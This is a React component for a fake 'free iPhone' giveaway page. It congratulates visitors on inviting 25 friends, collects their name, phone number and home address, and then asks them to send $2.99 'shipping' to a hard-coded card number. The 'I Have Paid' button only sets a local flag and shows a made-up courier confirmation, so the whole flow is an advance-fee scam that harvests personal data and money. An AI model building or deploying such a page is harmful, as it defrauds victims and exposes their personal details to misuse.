
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Copy } from 'lucide-react';
import { toast } from '@/hooks/use-toast';

export const DeliveryForm = ({ user }) => {
  const [formData, setFormData] = useState({
    fullName: `${user?.firstName || ''} ${user?.lastName || ''}`,
    addressLine1: '',
    addressLine2: '',
    city: '',
    postalCode: '',
    country: '',
    phoneNumber: ''
  });
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [hasPaid, setHasPaid] = useState(false);

  const cardNumber = "5522 0993 5880 7428";

  const handleInputChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleCountryChange = (value) => {
    setFormData({
      ...formData,
      country: value
    });
  };

  const copyCardNumber = () => {
    navigator.clipboard.writeText(cardNumber.replace(/\s/g, ''));
    toast({
      title: "Card Number Copied!",
      description: "Send $2.99 to this card number to complete your delivery.",
    });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    setIsSubmitted(true);
    
    toast({
      title: "Delivery Details Saved!",
      description: "Please complete payment to finalize your iPhone delivery.",
    });
  };

  const confirmPayment = () => {
    setHasPaid(true);
    localStorage.setItem('paid', 'true');
    
    toast({
      title: "Payment Confirmed! 🎉",
      description: "Our courier will contact you within 24 hours.",
    });
  };

  if (hasPaid) {
    return (
      <div className="bg-gradient-to-r from-green-900/40 to-blue-900/40 backdrop-blur-sm border border-green-500/30 rounded-xl p-8 text-center">
        <h2 className="text-3xl font-bold mb-4 text-green-400">
          🎉 Payment Confirmed!
        </h2>
        <p className="text-xl mb-4 text-gray-300">
          Congratulations! Your iPhone delivery has been confirmed.
        </p>
        <div className="bg-black/40 rounded-lg p-6 mb-6">
          <h3 className="text-lg font-bold mb-3 text-blue-300">What happens next?</h3>
          <ul className="text-left space-y-2 text-gray-300">
            <li>✅ Our courier will contact you within 24 hours</li>
            <li>✅ Estimated delivery: 7-10 business days</li>
            <li>✅ You'll receive tracking information via email</li>
            <li>✅ Free delivery to your address</li>
          </ul>
        </div>
        <p className="text-sm text-gray-400">
          Keep this page saved for reference. You'll receive updates via email.
        </p>
      </div>
    );
  }

  return (
    <div className="bg-black/40 backdrop-blur-sm border border-green-500/30 rounded-xl p-8">
      <h2 className="text-3xl font-bold mb-6 text-center bg-gradient-to-r from-green-400 to-blue-400 bg-clip-text text-transparent">
        🎉 Congratulations! Delivery Unlocked
      </h2>
      
      <div className="text-center mb-8">
        <p className="text-lg text-gray-300 mb-2">
          You've successfully invited 25 friends!
        </p>
        <p className="text-yellow-400 font-bold">
          Complete your delivery details below to receive your iPhone
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <Label htmlFor="fullName" className="text-gray-300">Full Name</Label>
            <Input
              id="fullName"
              name="fullName"
              type="text"
              required
              value={formData.fullName}
              onChange={handleInputChange}
              className="bg-black/40 border-gray-600 text-white"
              placeholder="John Doe"
            />
          </div>
          <div>
            <Label htmlFor="phoneNumber" className="text-gray-300">Phone Number</Label>
            <Input
              id="phoneNumber"
              name="phoneNumber"
              type="tel"
              required
              value={formData.phoneNumber}
              onChange={handleInputChange}
              className="bg-black/40 border-gray-600 text-white"
              placeholder="+1 234 567 8900"
            />
          </div>
        </div>

        <div>
          <Label htmlFor="addressLine1" className="text-gray-300">Address Line 1</Label>
          <Input
            id="addressLine1"
            name="addressLine1"
            type="text"
            required
            value={formData.addressLine1}
            onChange={handleInputChange}
            className="bg-black/40 border-gray-600 text-white"
            placeholder="123 Main Street"
          />
        </div>

        <div>
          <Label htmlFor="addressLine2" className="text-gray-300">Address Line 2 (Optional)</Label>
          <Input
            id="addressLine2"
            name="addressLine2"
            type="text"
            value={formData.addressLine2}
            onChange={handleInputChange}
            className="bg-black/40 border-gray-600 text-white"
            placeholder="Apartment, suite, etc."
          />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div>
            <Label htmlFor="city" className="text-gray-300">City</Label>
            <Input
              id="city"
              name="city"
              type="text"
              required
              value={formData.city}
              onChange={handleInputChange}
              className="bg-black/40 border-gray-600 text-white"
              placeholder="New York"
            />
          </div>
          <div>
            <Label htmlFor="postalCode" className="text-gray-300">Postal Code</Label>
            <Input
              id="postalCode"
              name="postalCode"
              type="text"
              required
              value={formData.postalCode}
              onChange={handleInputChange}
              className="bg-black/40 border-gray-600 text-white"
              placeholder="10001"
            />
          </div>
          <div>
            <Label htmlFor="country" className="text-gray-300">Country</Label>
            <Select onValueChange={handleCountryChange}>
              <SelectTrigger className="bg-black/40 border-gray-600 text-white">
                <SelectValue placeholder="Select country" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="us">United States</SelectItem>
                <SelectItem value="ca">Canada</SelectItem>
                <SelectItem value="uk">United Kingdom</SelectItem>
                <SelectItem value="de">Germany</SelectItem>
                <SelectItem value="fr">France</SelectItem>
                <SelectItem value="es">Spain</SelectItem>
                <SelectItem value="it">Italy</SelectItem>
                <SelectItem value="au">Australia</SelectItem>
                <SelectItem value="br">Brazil</SelectItem>
                <SelectItem value="mx">Mexico</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>

        {!isSubmitted ? (
          <Button
            type="submit"
            className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 py-3 text-lg font-bold"
          >
            Save Delivery Details
          </Button>
        ) : (
          <div className="space-y-6">
            <div className="bg-gradient-to-r from-yellow-900/40 to-orange-900/40 border border-yellow-500/30 rounded-lg p-6">
              <h3 className="text-xl font-bold mb-4 text-yellow-400">
                💳 Complete Payment ($2.99)
              </h3>
              <p className="text-gray-300 mb-4">
                To complete your iPhone delivery, please send $2.99 to this card:
              </p>
              
              <div className="flex items-center gap-2 mb-4">
                <div className="bg-black/60 border border-gray-600 rounded-lg px-4 py-3 flex-1 font-mono text-lg text-yellow-400 text-center">
                  {cardNumber}
                </div>
                <Button
                  onClick={copyCardNumber}
                  size="icon"
                  className="bg-yellow-600 hover:bg-yellow-700"
                >
                  <Copy className="w-4 h-4" />
                </Button>
              </div>
              
              <p className="text-sm text-gray-400 mb-4">
                Send exactly $2.99 for shipping and handling. This covers international delivery to your address.
              </p>
              
              <Button
                onClick={confirmPayment}
                className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 py-3 text-lg font-bold"
              >
                I Have Paid $2.99
              </Button>
            </div>
          </div>
        )}
      </form>
    </div>
  );
};
